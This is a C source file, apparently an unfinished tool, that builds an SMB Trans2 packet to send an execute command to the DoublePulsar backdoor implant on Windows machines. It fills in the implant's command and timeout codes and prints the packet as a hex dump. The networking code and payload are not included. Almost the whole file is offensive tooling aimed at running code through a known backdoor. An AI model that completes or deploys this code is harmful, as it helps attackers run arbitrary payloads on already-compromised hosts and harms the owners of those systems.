/*
The purpose is to generate a Doublepulsar execute SMB packet and fill in all the applicable values
so a proper request can be sent and executed on the Doublepulsar implant
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"wsock32.lib")

typedef unsigned short ushort;
typedef unsigned char uchar;

typedef unsigned short ushort;
typedef unsigned char uchar;

/*
However, the TCP/IP protocol headers do not have padding bytes, so the compiler must be instructed not to add them additional bytes into structures that map onto the IP protocol headers that a written to or read from Ethernet frames. Structures that do not contain padding bytes are said to be 'packed'. The syntax required to ensure structures are packed depends on the embedded C compiler. The FreeRTOS+TCP implementation cannot use any C compiler specific syntax in the common (not MCU port specific) files, and instead allows users to define their own packing directives in two very simple header files that are then included from the C files.
*/
#pragma pack(1)
//struct __attribute__((__packed__)) net_bios
typedef struct
{
	uint16_t type; //added by me; remove if there is a problem
	uint32_t length;
} net_bios;

//struct __attribute__((__packed__)) smb_header
typedef struct
{
	unsigned char protocol[4];
	unsigned char command;
	uint32_t NTSTATUS;
	unsigned char flag;
	ushort flag2;
	ushort PIDHigh;
	unsigned char SecuritySignature[8];
	//uint32_t signature; //unsigned char securityFeature[8]; OR 	BYTE SecuritySignature[8];
	//from Microsoft documentation: UCHAR  SecurityFeatures[8];
	ushort reserves;
	ushort tid;
	ushort pid;
	ushort uid;
	ushort mid;
} smb_header;

//struct __attribute__((__packed__)) Trans_Response

typedef struct
{
	unsigned char wordCount;
	ushort totalParameterCount;
	ushort totalDataCount;
	ushort maxParameterCount;
	ushort maxDataCount;
	unsigned char maxSetupCount;
	unsigned char reserved;
	ushort flags;
	uint32_t timeout;
	ushort reserved2;
	ushort parameterCount;
	ushort parameterOffset;
	ushort dataCount;
	ushort dataOffset;
	unsigned char setupCount;
	unsigned char reserved3;
	ushort subcommand;
	ushort byteCount;
	ushort padding;
} Trans_Response;
#pragma pop

/*
# SMB_Parameters
{
UCHAR WordCount;
USHORT Words[WordCount] (variable);
}
# SMB_Data
{
USHORT ByteCount;
UCHAR Bytes[ByteCount] (variable);
}
*/

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

void generate_SMB_packet()
{
	//alloc some memory here
	unsigned char send_buffer[4179];
	net_bios *nb = (net_bios*)send_buffer;
	smb_header* smb = (smb_header*)(send_buffer + sizeof(net_bios));
	Trans_Response *trans2 = (Trans_Response*)(send_buffer + sizeof(net_bios) + sizeof(smb_header));

	nb->type = 0x00;
	nb->length = htons(4174); //NetBIOS size = totalPacketSize - 4 ( NetBIOS header is not counted )
	//Size of smb_header + size of Trans2_Response header + parameter size + SMB_Data are counted in the packet size
	
	smb->protocol[0] = '\xff';
	smb->protocol[1] = 'S';
	smb->protocol[2] = 'M';
	smb->protocol[3] = 'B';
	smb->command = 0x32;
	smb->NTSTATUS = 0x00000000;
	smb->flag = 0x18;
	smb->flag2 = 0xc007;
	smb->PIDHigh = 0x0000;
	smb->SecuritySignature[0] = 0;
	smb->SecuritySignature[1] = 0;
	smb->SecuritySignature[2] = 0;
	smb->SecuritySignature[3] = 0;
	smb->SecuritySignature[4] = 0;
	smb->SecuritySignature[5] = 0;
	smb->SecuritySignature[6] = 0;
	smb->SecuritySignature[7] = 0;

	smb->reserves = 0x0000;
	smb->pid = 0xfeff; 
	smb->tid = 2048;
	smb->uid = 2048;
	smb->mid = 66;
	
	trans2->wordCount = 15;
	trans2->totalParameterCount = 12;
	trans2->totalDataCount = 4096;
	trans2->maxParameterCount = 1;
	trans2->maxDataCount = 0;
	trans2->maxSetupCount = 0;
	trans2->reserved = 0;
	trans2->flags = 0x0000;
	trans2->timeout = 0x001a8925;
	trans2->reserved2 = 0x0000;
	trans2->parameterCount = 12;
	trans2->parameterOffset = 66; // make this dynamic -> calc based off sizeof(netbios)+sizeof(trans2) <PARAMS>
	trans2->dataCount = 4096;
	trans2->dataOffset = 78; // make this dynamic -> calc based off sizeof(netbios)+sizeof(trans2)+sizeof(params)
	trans2->setupCount = 1;
	trans2->reserved3 = 0x00;
	trans2->subcommand = 0x000e;
	trans2->byteCount = 4109; //make this dynamic -> calc based off sizeof(params)+sizeof(SMB_DATA)
	trans2->padding = 0x00;


	hexDump(0, send_buffer, 4178);

	getchar();
}
